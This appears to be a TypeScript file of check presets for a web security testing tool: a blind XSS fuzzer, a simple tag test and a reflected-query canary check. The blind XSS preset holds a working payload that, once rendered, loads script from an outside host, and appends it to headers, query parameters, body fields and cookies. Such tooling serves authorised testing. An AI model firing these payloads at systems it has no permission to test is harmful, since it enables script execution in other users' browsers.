import type { CheckRule } from "../../types";

export type CheckPreset = Omit<CheckRule, "id">;

export const bxssCheck: CheckPreset = {
  name: "Blind XSS",
  description:
    "Fuzz meaningful headers, cookies, query params and body with a blind XSS payload",
  code: `const bxssDomain = "a.bbrl.pro";
const createPayload = () =>
  \`"><svg/onload=import('//\${bxssDomain}/\${random()}')>\`;

const headerBlacklist = new Set([
  "accept",
  "accept-encoding",
  "accept-language",
  "authorization",
  "cache-control",
  "connection",
  "content-length",
  "content-type",
  "cookie",
  "dnt",
  "expect",
  "host",
  "if-match",
  "if-modified-since",
  "if-none-match",
  "if-range",
  "if-unmodified-since",
  "keep-alive",
  "pragma",
  "priority",
  "proxy-authorization",
  "proxy-connection",
  "range",
  "te",
  "trailer",
  "transfer-encoding",
  "upgrade",
  "upgrade-insecure-requests",
]);

const processedHeaders = new Set();

for (const header of request.headers.items) {
  const name = header.name;
  const normalizedName = name.toLowerCase();

  if (
    headerBlacklist.has(normalizedName) ||
    normalizedName.startsWith("sec-") ||
    processedHeaders.has(normalizedName)
  ) {
    continue;
  }

  processedHeaders.add(normalizedName);
  const originalValues = request.headers.getAll(name);
  const payload = createPayload();

  request.headers.set(name, (originalValues[0] ?? "") + payload);
  await send(request);

  request.headers.remove(name);
  for (const value of originalValues) {
    request.headers.add(name, value);
  }
}
for (const param of request.query.items) {
  const original = param.value;
  const encodedPayload = encode(createPayload(), "url", { strict: true });
  request.query.set(param.name, String(original ?? "") + encodedPayload);
  await send(request);
  request.query.set(param.name, original);
}

// Fuzz body fields (json / urlencoded / multipart)
for (const field of request.body.items) {
  const original = field.value;
  const payload = createPayload();
  request.body.set(field.name, String(original ?? "") + payload);
  await send(request);
  request.body.set(field.name, original);
}

const processedCookies = new Set();

for (const cookie of request.cookies.items) {
  if (
    cookie.name === "" ||
    cookie.name === "__areplay" ||
    processedCookies.has(cookie.name)
  ) {
    continue;
  }

  processedCookies.add(cookie.name);
  const original = request.cookies.get(cookie.name) ?? "";
  const payload = createPayload();

  request.cookies.set(cookie.name, original + payload);
  await send(request);
  request.cookies.set(cookie.name, original);
}
`,
};

export const tagTestCheck: CheckPreset = {
  name: "Tag Test",
  description: "Send two simple query variations for scanner tag testing",
  code: `request.query.set("xyz", "1");
await send(request);
request.query.remove("xyz");

request.query.set("abc", "2");
await send(request);
request.query.remove("abc");`,
};

export const reflectedQueryCheck: CheckPreset = {
  name: "Reflected Query Parameters",
  description: "Test query parameters for reflection in the response body",
  code: `for (const param of request.query.items) {
  const original = param.value;
  const canary = \`ar\${random(12)}ra\`;

  request.query.set(param.name, canary);
  const result = await send(request);
  request.query.set(param.name, original);

  if (
    result.kind === "Ok" &&
    result.response.body?.raw.includes(canary) === true
  ) {
    console.log(
      \`Reflected query parameter "\${param.name}" with canary "\${canary}"\`,
    );
  }
}`,
};
